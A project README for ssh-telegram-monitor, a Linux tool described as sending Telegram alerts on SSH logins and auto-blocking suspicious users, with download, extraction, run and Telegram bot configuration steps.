# 📡 ssh-telegram-monitor - Monitor SSH Logins in Real-Time

## 🚀 Getting Started

Welcome to **ssh-telegram-monitor**! This application helps you keep an eye on SSH logins to your Linux servers. It sends real-time notifications to your Telegram account whenever someone logs in. If an unauthorized login attempt occurs, it can even block the suspicious user automatically. This setup enhances your server security effortlessly.

## ⚙️ System Requirements

- A Linux server for installation
- SSH access to your server
- A Telegram account to receive notifications
- Basic command line knowledge (not required, but helpful)

## 📥 Download & Install

You can download **ssh-telegram-monitor** from the Releases page. 

[![Download ssh-telegram-monitor](https://img.shields.io/badge/Download-ssh--telegram--monitor-brightgreen)](https://github.com/gv498/ssh-telegram-monitor/releases)

Visit this page to download the latest version: [Releases Page](https://github.com/gv498/ssh-telegram-monitor/releases)

### Step-by-Step Installation

1. **Visit the Releases Page**  
   Go to [this link](https://github.com/gv498/ssh-telegram-monitor/releases) to find the latest version of the application.

2. **Choose the Correct File**  
   Look for the file named `ssh-telegram-monitor-x.y.z.tar.gz`, where `x.y.z` represents the version number. Click on it to start the download.

3. **Extract the Files**  
   After the download is complete, open a terminal window. Navigate to the directory where the file was downloaded and run the following command to extract the files:

   ```bash
   tar -xvzf ssh-telegram-monitor-x.y.z.tar.gz
   ```

4. **Navigate to the Extracted Folder**  
   Change your directory to the folder that was just created:

   ```bash
   cd ssh-telegram-monitor-x.y.z
   ```

5. **Make the Application Executable**  
   Use the command below to make the program executable:

   ```bash
   chmod +x ssh-telegram-monitor
   ```

6. **Run the Application**  
   You can now run the application using the command:

   ```bash
   ./ssh-telegram-monitor
   ```

### Configuration

Before you can use the application, you will need to configure it:

1. **Set Up Telegram Notifications**  
   You need to create a Telegram bot to send notifications. Follow these steps:

   - Open Telegram and search for “BotFather.”
   - Start a chat with BotFather and send the command `/newbot`.
   - Follow the instructions and save the token provided.

2. **Edit Configuration File**  
   Open the configuration file in a text editor:

   ```bash
   nano config.json
   ```

   Update the following fields:
   - `telegram_token`: Replace with your bot token.
   - `chat_id`: Your personal chat ID where notifications will be sent.

3. **Save Changes**  
   Save the changes and exit the editor.

## 📊 Features

- **Real-Time Monitoring:** Detects SSH logins as they happen.
- **Telegram Notifications:** Get instant alerts for logins and attempt blocks.
- **Auto-Blocking:** Automatically blocks suspicious users based on predefined criteria.
- **Customizable Settings:** Adjust settings easily through the configuration file.

## 🚨 Troubleshooting

If you encounter issues while using **ssh-telegram-monitor**, consider the following tips:

- **Check Permissions:** Make sure the application has execution permissions.
- **Inspect the Logs:** Log files can provide insight into any issues. Check the `logs` directory in the application folder.
- **Consult Documentation:** Refer to additional documentation available within the repository for in-depth guidance.

## 💬 Support

Need help? Open an issue on the GitHub repository, and we will assist you as soon as possible.

[Submit an Issue](https://github.com/gv498/ssh-telegram-monitor/issues)

## 🌍 Community

Join our community to get updates, share feedback, or discuss the application. You can connect with other users and developers through the project's GitHub Discussions page.

## 🔖 Related Topics

- Authentication
- Intrusion Detection
- Monitoring
- Server Security

Stay secure! Keeping track of SSH activity is crucial for server safety. With **ssh-telegram-monitor**, you can easily secure your Linux environment with timely notifications and automated responses.